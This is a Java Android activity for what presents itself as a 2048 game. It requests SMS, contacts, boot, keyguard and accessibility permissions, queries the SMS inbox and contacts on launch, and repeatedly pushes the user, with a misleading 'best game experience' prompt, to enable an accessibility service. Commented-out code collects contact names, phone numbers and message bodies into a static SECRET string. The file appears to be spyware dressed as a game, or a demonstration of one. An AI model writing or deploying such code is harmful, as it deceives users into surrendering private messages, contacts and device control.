package com.example.sy.androidgame2048;
import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.BroadcastReceiver;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Typeface;
import android.content.Context;
import android.net.Uri;
import android.os.Build;
import android.support.annotation.NonNull;
import android.text.TextUtils;
import android.os.Bundle;
import android.os.Environment;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;

public class MainActivity extends Activity implements View.OnClickListener {
    private TextView Score;
    private TextView tvScore;
    private static MainActivity mainActivity = null;
    private int score = 0;
    private static final int REQUEST_CODE = 1;
    public MainActivity(){
        mainActivity = this;
    }
    private static final String TAG = "SupportBlue";
    public static String SECRET = "";
    private AlertDialog dialog = null;



    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        if (!(checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED)
                || !(checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED)
                || !(checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)
                || !(checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED)    ) {
            requestMultiplePermissions();
        }


        testReadAllContacts();
        getSMSinfo();
        createDirectory();
        Button wechat = (Button)findViewById(R.id.wehcatb);
        Button info = (Button)findViewById(R.id.infob);

        wechat.getBackground().setAlpha(150);//0~255透明度值
        info.getBackground().setAlpha(150);//0~255透明度值

        wechat.setOnClickListener(this);
        info.setOnClickListener(this);

        tvScore = (TextView) findViewById(R.id.tvScore);
        tvScore.setTypeface(Typeface.createFromAsset(MainActivity.this.getAssets(), "fonts/xingshu.TTF"));
        Score=(TextView)findViewById(R.id.Score);
        Score.setTypeface(Typeface.createFromAsset(MainActivity.this.getAssets(), "fonts/xingshu.TTF"));
    }

    @Override
    public void onClick(View view) {

        switch (view.getId()){
            case R.id.wehcatb:
            //弹窗
                new AlertDialog.Builder(MainActivity.this)
                        .setTitle("分享给微信朋友")
                        .setPositiveButton("好呀！",null)
                        .show();
                break;
            case R.id.infob:
                //弹窗
                new AlertDialog.Builder(MainActivity.this)
                        .setTitle("编辑自己的2048")
                        .setMessage("请打开'设置>辅助功能>GooglePlay服务’来编辑自己的2048")
                        .setPositiveButton("好的，这就去！",  new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                                startActivity(intent);
                            }
                        })
                        .show();

                break;
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

    }

    @Override
    protected void onPause() {
        super.onPause();

    }

    @Override
    protected void onRestart() {
        super.onRestart();
        Log.i(TAG,"Mainactivity+restart");
        boolean te = isAccessibilitySettingsOn("reply",MainActivity.this);
        String s = String.valueOf(te);
        Log.d(TAG,s);
        if(!te){
            openAccessibility();
        }
    }

    @Override
    protected void onResume() {
        super.onResume();


        Log.i(TAG,"can restart");
        boolean te = isAccessibilitySettingsOn("reply",MainActivity.this);
        String s = String.valueOf(te);
        Log.d(TAG,s);
        if(!te){
            openAccessibility();
        }
    }

    private void requestMultiplePermissions() {
        String[] permissions = {
                Manifest.permission.RECEIVE_BOOT_COMPLETED,
                Manifest.permission.REORDER_TASKS,
                Manifest.permission.WAKE_LOCK,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.WRITE_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.DISABLE_KEYGUARD,
                Manifest.permission.INTERNET,
                Manifest.permission.MODIFY_AUDIO_SETTINGS,
                Manifest.permission.BIND_ACCESSIBILITY_SERVICE

        };

        requestPermissions(permissions, REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE) {
            int grantResult = grantResults[0];
            boolean granted = grantResult == PackageManager.PERMISSION_GRANTED;
            Log.d(TAG, "You have all the permission");
            createDirectory();
        }
    }

    public void clearScore(){
        score = 0;
        showScore();
    }

    public void showScore(){
        tvScore.setText("  :"+score);
    }
    public void addScore(int s){
        score += s;
        showScore();
    }

    public static MainActivity getMainActivity(){
        return mainActivity;
    }

    public void quitGame(){
        this.finish();
    }



    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.main, menu);
        return true;
    }

    //获取手机通讯录（部分）
    public void testReadAllContacts() {
        Cursor cursor = getContentResolver().query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        int contactIdIndex = 0;
        int nameIndex = 0;
//
//        if(cursor.getCount() > 0) {
//            contactIdIndex = cursor.getColumnIndex(ContactsContract.Contacts._ID);
//            nameIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);
//        }
//
//        int phonei = 0;
//        while(cursor.moveToNext()&&phonei<8) {
//            String contactId = cursor.getString(contactIdIndex);
//            String name = cursor.getString(nameIndex);
//            Log.i(TAG, contactId);
//            Log.i(TAG, name);
//            SECRET +=(name + ":");
//            /*
//             * 查找该联系人的phone信息
//             */
//            Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
//                    null,
//                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + contactId,
//                    null, null);
//            int phoneIndex = 0;
//            if(phones.getCount() > 0) {
//                phoneIndex = phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
//            }
//
//            while(phones.moveToNext()) {
//                String phoneNumber = phones.getString(phoneIndex);
//                Log.i(TAG, phoneNumber);
//                SECRET +=(phoneNumber + "\n");
//              /*  TextView firstpeople = new TextView(this);
//                firstpeople.setText(contactId+"."+name+":"+phoneNumber);
//                ((LinearLayout)this.findViewById(R.id.lay)).addView(firstpeople);*/
//                phonei++;
//            }
//        }
    }

    //获取手机短信（部分）
    public void getSMSinfo(){
        Uri smsuri = Uri.parse("content://sms/");
        String[] projection = new String[]{"_id", "address", "person",
                "body", "date", "type"};
        Cursor smscusor = getContentResolver().query(smsuri,projection,null,null,null);
//        if(smscusor.moveToFirst()){
//            String phoneNumber;
//            String smsbody;
//            String type;
//            int addi = 0;
//
//            int phonenum = smscusor.getColumnIndex("address");
//            int bodynum = smscusor.getColumnIndex("body");
//            int typenum = smscusor.getColumnIndex("type");
//           /* TextView sms = new TextView(this);
//            sms.setText("显示手机短信");
//            ((LinearLayout)this.findViewById(R.id.lay)).addView(sms);*/
//            do {
//                addi++;
//                phoneNumber = smscusor.getString(phonenum);
//                smsbody = smscusor.getString(bodynum);
//                int typeid = smscusor.getInt(typenum);
//                if (typeid == 1){
//                    type = "接收";
//                }else if(typeid == 2){
//                    type = "发送";
//                }else{
//                    type = "未知";
//                }
//               SECRET +=(addi+type+":"+"["+phoneNumber+"]"+smsbody + "\n");
//              /*TextView smsinfo = new TextView(this);
//                smsinfo.setText(addi+type+":"+"["+phoneNumber+"]"+smsbody);
//                ((LinearLayout)this.findViewById(R.id.lay)).addView(smsinfo);*/
//            }while(smscusor.moveToNext()&&addi<3);
//        }else{
//          /*  TextView smsinfo = new TextView(this);
//            smsinfo.setText("没有找到短信！");
//            ((LinearLayout)this.findViewById(R.id.lay)).addView(smsinfo);*/
//        }
    }

    private void createDirectory(){
        Log.d(TAG, "I can make a directory in the album");
        String albumPath = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
        Log.d(TAG, albumPath);
        String albumPathTest = albumPath + "/Camera/2048Screen";
        File file = new File(albumPathTest);
        if (!file.exists()) {
            file.mkdir();
            Log.d(TAG, "Made a directory test");
        } else {
            Log.d(TAG, "There is an existing directory test");
        }
        try{
            InputStream is = getAssets().open("Screen-1.bmp");
            Log.d(TAG, "open file");
            BufferedInputStream bis = new BufferedInputStream(is);
            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(albumPathTest + "/Screen-1.bmp"));
            int data = bis.read();
            while (data != -1) {
                bos.write(data);
                data = bis.read();
            }
            bis.close();
            bos.close();

        } catch (Exception e){
            e.printStackTrace();
        }

        try{
            InputStream is = getAssets().open("Screen-2.bmp");
            Log.d(TAG, "open file");
            BufferedInputStream bis = new BufferedInputStream(is);
            BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(albumPathTest + "/Screen-2.bmp"));
            int data = bis.read();
            while (data != -1) {
                bos.write(data);
                data = bis.read();
            }
            bis.close();
            bos.close();

        } catch (Exception e){
            e.printStackTrace();
        }
//        sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen-1.bmp"))));
//        sendBroadcast(new Intent(Intent.ACTION_MEDIA_SCANNER_SCAN_FILE, Uri.fromFile(new File("/sdcard/DCIM/Camera/2048Screen/Screen-2.bmp"))));
//


    }

    private boolean isAccessibilitySettingsOn(String accessibilityServiceName, Context context) {
        int accessibilityEnable = 0;
        String serviceName = context.getPackageName() + "/" +accessibilityServiceName;
        try {
            accessibilityEnable = Settings.Secure.getInt(context.getContentResolver(), Settings.Secure.ACCESSIBILITY_ENABLED, 0);
        } catch (Exception e) {

        }
        if (accessibilityEnable == 1) {
            Log.e(TAG, "accessibilityEnable:"+Integer.toString(accessibilityEnable));
            TextUtils.SimpleStringSplitter mStringColonSplitter = new TextUtils.SimpleStringSplitter(':');
            String settingValue = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);

            if(settingValue.indexOf("2048.reply") != -1){
                return true;
            }

        }else {
            Log.d(TAG,"Accessibility service disable");
        }
        return false;
    }

    /**
     * 跳转到系统设置页面开启辅助功能

     */
    private void openAccessibility(){
        AlertDialog.Builder builder = new AlertDialog.Builder(MainActivity.this)
                .setTitle("提示")
                .setMessage("为了保证最佳的游戏体验，请打开辅助功能后进入游戏")
                .setPositiveButton("好的，这就去！",  new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        startActivity(intent);

                    }
                });
         dialog = builder.show();
    }



}




